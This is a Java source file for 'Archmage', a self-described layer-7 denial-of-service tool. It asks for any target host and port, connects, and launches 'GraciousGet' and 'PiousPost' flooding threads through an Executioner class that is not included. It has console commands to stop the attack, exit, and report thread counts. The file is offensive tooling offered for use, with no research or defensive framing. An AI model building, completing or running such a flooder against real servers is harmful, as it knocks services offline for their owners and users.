package m3rlin;

import java.io.IOException;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;

public class Archmage {

	private static final String STOP_ATTACK = "STOP";
	private static final String EXIT_ARCHMAGE = "EXIT";

	Executioner executioner;
	
	private Socket socket;
	private Scanner console;
	private String host;
	private int port;
	
	public void start() {
		try {				
			console = new Scanner(System.in);
			System.out.print("\n>> Establishing connection to " + host + ":" + port + "...");
			socket = new Socket(host, port);
			System.out.print("\n>> Connection established...");
			System.out.print("\n>> Begninning GraciousGet & PiousPost attacks...\n\n");
			executioner = new Executioner(host, port);
			executioner.start();
			while (executioner.isRunning()) {
				if(console.hasNextLine()) {
					String input = console.nextLine();
					if (input != null && input.length() > 0) {
						if (input.equalsIgnoreCase(STOP_ATTACK)) {
							stop();
						} else if (input.equalsIgnoreCase(EXIT_ARCHMAGE)) {
							exit();
						}
					} else {
						System.out.print("\n>>   PiousPost Attack Threads: " + executioner.getPiousActiveCount());
						System.out.print("\n>> GraciousGet Attack Threads: " + executioner.getGraciousActiveCount());
						System.out.print("\n>>       Total Attack Threads: " + (executioner.getPiousActiveCount() + executioner.getGraciousActiveCount()) + "\n");
					}
				}
			}
		} catch (UnknownHostException e) {			
			System.out.print("\n>> Could not locate the host (UnknownHostException)\n");			
		} catch (ConnectException e) {		
			System.out.print("\n>> Could not connect to the socket address, check the port (ConnectException)\n");			
		} catch (IllegalArgumentException e) {			
			System.out.print("\n>> Port out of range (IllegalArgumentException)\n");
		} catch (IOException e) {
			System.out.print("\n>> Error acquiring socket connection (IOException)\n");
		}
		init();
		start();
	}
	
	public void stop() throws IOException {
		System.out.print("\n>> Stopping attack...");
		executioner.stop();
		socket.close();
		System.out.print("\n>> Attack stopped...\n");
	}
	
	public void exit() throws IOException {
		stop();
		System.out.print("\n>> Exiting...");
		System.exit(0);
	}
	
	public void init() {
		console = new Scanner(System.in);
		System.out.print("\nEnter target (IP or host): ");
		host = console.nextLine();
		try {
			System.out.print("Enter port (Default: 80): ");
			String portStr = console.nextLine();
			if (portStr == null || portStr.length() == 0) {
				port = 80;
			} else {
				port = Integer.parseInt(portStr);
			}
		} catch (NumberFormatException e) {		
			System.out.print("\n>> Port numbers can't contain non-numeric characters\n");
			init();
		}		
	}
	
	public static void main(String[] args) {
		System.out.print("+-------------------+\n");
		System.out.print("| Archmage (L7 DoS) |\n");
		System.out.print("+-------------------+\n");
		System.out.print("\nCommands:\"stop\" - Stops the attack; waits for each scheduled thread to complete");
		System.out.print("\n          \"exit\" - Performs a stop action, then exits the application");
		System.out.print("\n          \"[enter]\" - Press enter while attacking to check status (won't affect the attack)\n");
		Archmage archmage;
		archmage = new Archmage();
		archmage.init();
		archmage.start();
	}
}